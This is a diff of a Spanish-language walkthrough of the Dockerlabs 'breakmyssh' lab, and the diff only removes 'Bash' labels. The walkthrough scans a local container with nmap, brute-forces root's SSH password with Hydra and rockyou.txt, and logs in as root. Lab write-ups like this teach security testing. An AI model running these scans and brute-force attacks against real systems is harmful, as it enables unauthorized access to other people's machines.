@@ -14,7 +14,6 @@ Flujo de Trabajo (Paso a Paso)
 1. Despliegue de la Máquina
 Se inicia el laboratorio en el entorno local utilizando el script de autodeploy de Dockerlabs.
 
-Bash
 
 
 sudo auto_deploy breakmyssh.tar
@@ -23,7 +22,6 @@ sudo auto_deploy breakmyssh.tar
 2. Reconocimiento y Escaneo de Puertos
 Se realiza un escaneo de puertos TCP sobre la dirección IP del contenedor (172.17.0.2) para identificar servicios activos.
 
-Bash
 
 
 nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2 -oN puertos.txt
@@ -32,7 +30,6 @@ Resultado: El puerto 22/tcp (SSH) se encuentra abierto.
 3. Detección de Servicios y Versiones
 Se ejecuta un escaneo enfocado en el puerto 22 para determinar la versión exacta del servicio.
 
-Bash
 
 
 nmap -sCV -p22 172.17.0.2 -oN servicios.txt
@@ -41,7 +38,6 @@ Resultado: El puerto corre OpenSSH 7.7.
 4. Explotación (Fuerza Bruta SSH)
 Dado que no existen otros vectores expuestos, se realiza un ataque de fuerza bruta contra el servicio SSH utilizando Hydra y un diccionario de contraseñas.
 
-Bash
 
 
 hydra -l root -P /ruta/a/rockyou.txt ssh://172.17.0.2 -t 4 -V
@@ -50,7 +46,6 @@ Resultado: Se identificaron credenciales válidas para el usuario root.
 5. Post-Explotación y Verificación
 Se inicia sesión mediante SSH utilizando las credenciales obtenidas para confirmar el acceso total al sistema.
 
-Bash
 
 
 ssh root@172.17.0.2
